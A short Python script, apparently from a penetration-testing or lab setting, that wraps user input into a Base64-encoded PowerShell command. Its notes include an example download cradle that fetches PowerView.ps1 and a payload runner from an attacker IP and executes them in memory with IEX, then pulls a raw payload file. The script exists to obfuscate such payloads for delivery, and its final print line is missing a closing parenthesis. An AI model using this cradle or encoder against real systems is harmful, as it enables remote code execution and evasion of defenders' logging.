#!/usr/bin/env python3
import subprocess, shlex

NOTES=r'''
pythonic pwsh like this:
$ pwsh
$text="`$wc = [System.Net.WebClient]::New() ; (`$wc.DownloadString('http://10.10.14.26/PowerView.ps1') | IEX ) ; (`$wc.DownloadString('http://10.10.14.26/Invoke-MerklibRunner.ps1') | IEX ); Invoke-MerklibRunner -pay http://10.10.14.26/fun/0MiXmSl1iL0z.raw"
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($text))

... without having to escape anything in $text, i.e., what you send is what you get
'''

def pwsh_base64_encoded_command(inp):
    ## import subprocess, shlex
    ## call like:
    ### inp = input("give INSERT: ")
    ### encoded_command = pwsh_base64_encoded_command(inp)
    inp_modded = inp.replace('$',r'`$').replace(r'"',r'`"')
    command = shlex.split(f"pwsh -Command '[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes(\"{inp_modded}\"))'")
    encoded_command = subprocess.check_output(command, shell=False, stderr=subprocess.STDOUT).decode('utf-8').rstrip(r'\n')
    print(encoded_command)
    return encoded_command

def main():
  while True:
    inp = input("give INSERT: ")
    encoded_command = pwsh_base64_encoded_command(inp)
    print(encoded_command)
    print(f"verify WYSIWYG:   base64 -d <<<{encoded_command}"

if __name__=="__main__":
  main()
